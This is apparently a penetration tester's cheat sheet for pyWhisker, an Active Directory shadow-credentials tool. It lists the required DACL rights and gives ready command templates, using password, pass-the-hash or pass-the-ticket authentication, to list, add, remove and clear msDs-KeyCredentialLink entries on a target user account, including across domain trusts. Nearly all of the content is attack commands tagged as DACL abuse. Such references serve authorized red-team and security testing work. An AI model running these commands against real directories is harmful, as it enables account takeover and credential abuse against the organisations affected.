# pyWhisker

% dacl, shadow credentials, msDs-KeyCredentialLink, https://github.com/ShutdownRepo/pywhisker
#plateform/linux #target/remote #cat/AD/RECON 


## pyWhisker - Notes
```
To install add pycryptodome to requirements.txt
plus
pip install pyOpenSSL==24.0.0
```

## pyWhisker - Attack requierements
```
GenericAll, GenericWrite, WriteProperty or Validated-SPN 
DC must have its own certificate and keys (RB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP)
```

## auth - cred
```bash
-u <user> -p <password> 
```

## auth - pth
```bash
-u <user> -H <nt_hash> 
```

## auth - ptt
```bash
-u <user> -k -no-pass 
```

## list all current KeyCredentials ID and creation time (cred)
```
pywhisker.py --dc-ip <dc_ip> -d <domain_fqdn> -u <user> -p <password> --target <target_user> --action "list"
```


## list all current KeyCredentials ID and creation time (pth)
```
pywhisker.py --dc-ip <dc_ip> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "list"
```

## list all current KeyCredentials ID and creation time (ptt)
```
pywhisker.py -k -no-pass --dc-ip <dc_ip> -d <domain_fqdn> -u <user> --target <target_user> --action "list"
```

## get info on KeyCredential (pth)
```
pywhisker.py --dc-ip <dc_ip> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "info" --device-id=<device_id>
```


## remove KeyCredential (pth)
#cat/ATTACK/AD/DACL-ABUSE
```
pywhisker.py --dc-ip <dc_ip> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "remove" --device-id=<device_id>
```

## clear KeyCredential (pth)
#cat/ATTACK/AD/DACL-ABUSE
```
pywhisker.py --dc-ip <dc_ip> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "clear" 
```

## add KeyCredential (pth)
#cat/ATTACK/AD/DACL-ABUSE
```
pywhisker.py --dc-ip <dc_ip> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "add"  -f <pfx_file> -P <pfx_password|jubeaz>
```


## cross-domain - list all current KeyCredentials ID and creation time (cred) (TRUST)
#cat/ATTACK/AD/DACL-ABUSE
```
pywhisker.py --dc-ip <target_dc_ip> --target-domain <target_domain> -d <domain_fqdn> -u <user> -p <password> --target <target_user> --action "list"
```


## cross-domain - list all current KeyCredentials ID and creation time (pth)
```
pywhisker.py --dc-ip <target_dc_ip> --target-domain <target_domain> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "list"
```


## cross-domain - get info on KeyCredential (pth)
```
pywhisker.py --dc-ip <target_dc_ip> --target-domain <target_domain> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "info" --device-id=<device_id>
```


## cross-domain - remove KeyCredential (pth)
#cat/ATTACK/AD/DACL-ABUSE
```
pywhisker.py --dc-ip <target_dc_ip> --target-domain <target_domain> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "remove" --device-id=<device_id>
```

## cross-domain - clear KeyCredential (pth)
#cat/ATTACK/AD/DACL-ABUSE
```
pywhisker.py --dc-ip <target_dc_ip> --target-domain <target_domain> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "clear" 
```

## cross-domain - add KeyCredential (pth)
#cat/ATTACK/AD/DACL-ABUSE
```
pywhisker.py --dc-ip <target_dc_ip> --target-domain <target_domain> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "add"  -f <pfx_file> -P <pfx_password|jubeaz>
```

